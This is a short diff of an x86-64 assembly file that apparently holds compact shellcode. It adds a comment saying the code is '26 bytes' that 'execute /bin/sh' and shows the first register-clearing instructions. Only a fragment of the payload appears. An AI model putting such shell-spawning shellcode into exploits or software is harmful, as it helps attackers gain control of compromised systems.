@@ -27,8 +27,9 @@
 ;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 ;  POSSIBILITY OF SUCH DAMAGE.
 ;    
-
-    bits 64
+; 26 bytes execute /bin/sh
+;
+    bits    64
 
     xor     esi, esi         ; esi = 0
     mul     esi              ; eax = 0, edx = 0
